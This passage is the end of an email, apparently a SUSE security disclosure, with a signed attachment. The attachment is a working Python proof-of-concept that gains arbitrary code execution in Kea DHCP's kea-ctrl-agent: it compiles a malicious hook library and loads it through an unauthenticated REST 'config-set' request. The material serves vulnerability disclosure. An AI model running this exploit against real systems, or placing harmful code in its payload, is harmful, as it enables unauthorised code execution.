GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew McDonald, Werner Knoblich

--V0KiV935LK37uLiw
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="kea-hook-lib-exploit.py"

#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# Date: 2025-03-28
#
# Kea DHCP arbitrary code execution exploit via REST API.
#
# This script demonstrates how to achieve arbitrary code execution when
# `kea-ctrl-agent` is running and does not require authenticaton for its REST
# API interface running on localhost:8000.
#
# When Kea services are running as non-root then the exploit can still be used
# to gain full control over the kea service user.
#
# For demonstration purposes the hook library injected into `kea-ctrl-agent`
# simply creates a new file on disk. Any code can be placed into the
# `LIB_CODE` variable below, however.
#
# pre-requisites to run the exploit:
#
# - GCC compiler needs to be installed
# - kea-ctrl-agent needs to be running
# - curl needs to be installed
#
# If `kea-ctrl-agent` runs as root then it should be possible to create a file
# in /etc, for example:
#
#     kea-hook-lib-exploit.py /etc/evil-file.txt
#
# If `kea-ctrl-agent` runs as a dedicated service user then it should be
# possible to create a file in kea's state directory:
#
#     kea-hook-lib-exploit.py /var/lib/kea/evil-file.txt
#
# Note that on Debian and Ubuntu Linux AppArmor policies are in place that
# prevent this exploit from succeeding.

import argparse
import os
import subprocess
import tempfile


parser = argparse.ArgumentParser()
parser.add_argument("PATH", type=str,
        help="Where to create a test file during code execution. Note that if the path is within a non-accessible directory (e.g. in /root) that the exploit-success detection cannot work.")

args = parser.parse_args()

# NOTE: curly braces need escaping here
LIB_CODE = f"""
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

void __attribute__ ((constructor)) evil_init(void) {{
        int fd = open("{args.PATH}", O_CREAT|O_RDWR, 0655);
        write(fd, "evil", 4);
        close(fd);
}}
"""


def run(command):
    print(" ".join(command))
    subprocess.check_call(command)
    print()


with tempfile.TemporaryDirectory() as tmpdir:
    # allow kea-ctrl-agent to access our library in case it's running as non-root
    os.chmod(tmpdir, 0o755)
    lib_source = f"{tmpdir}/libevil.c"
    with open(lib_source, "w") as fd:
        fd.write(LIB_CODE)
    shared_obj = f"{tmpdir}/libevil.so"
    run(f"gcc {lib_source} -shared -fPIC -o{shared_obj}".split())

    curl_cmdline = "curl -X POST -H".split()
    curl_cmdline.append("Content-Type: application/json")
    curl_cmdline.append("-d")
    # NOTE: the format string needs escaping of curly braces
    kea_json = f"""{{
        "command": "config-set",
        "arguments": {{
            "Control-agent": {{
                "hooks-libraries": [{{"library": "{shared_obj}"}}]
            }}
        }}
    }}"""
    curl_cmdline.append(kea_json)
    curl_cmdline.append("localhost:8000")

    run(curl_cmdline)

    print()

    if os.path.exists(args.PATH):
        print(f"Exploit succeeded, {args.PATH} has been created")
    else:
        print("Exploit did not succeed")

--V0KiV935LK37uLiw--

--/sJFtjjL1rV4ZsWD
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmg3RhEACgkQFMQFyXGS
NVPd+BAAopuMBQvcoTAE/ZutRJajm7DKUkNIlV9UFNwDEuEvOAtVBUsnnj0dLUeE
qnth8HHrZVEStpo9LRQ7cF/ZW09f36/kuS7HWEhZQbMPy181o9iZ16QezqMfEsU9
oTorQos5fYhoa/m1NbGCxdB1RGDaFxu8nPhvY5ZOk/kzP2hqbuoXWaROMt/nKics
nsaiTi9eEcNjqcfVlfpcVfNVK5ylFi2GuDWFM1VKUoYHS5IRqCZWpQYPh32tKLCp
abP6vrOEt2Tl8vwwLh8qgdoJ1m7rwb1/qWmSeF+0diReFztxaZNJDWy+S2R59td3
zCe90REP56HWd03bQeqEVCehMlDFmH0Hoafxq4YBdHaK+MvpjPrRnD0CTGHl2qSo
XtQDm1xQUMKxcT48M14Pobv4cjDehbKRi1sY4vzZPU8EP7fXLDlgBfwW1+XY6LAa
Uhl/j940dSeEyIytRn4PVVaFN5uyiDE485Wr9BSTbrKm1PA6/TN4Oksy9j50r8lr
ZCWMkyAJPHeoJEElqOzy3mzflNoWTRij/82aiDC6yNEQoKIyabK8miAPVa5RB3JU
5s4nHPmzIzyCNIeUtZP1Q1raBgAt+wqsK1FGvx95SG/VED49yZsNQ5uVArfbdKuO
IJWrP0czTntUttrh+wzFw2/Wl4WQOwbG6BdBvrAY3C2CsmXz93k=
=48di
-----END PGP SIGNATURE-----

--/sJFtjjL1rV4ZsWD--

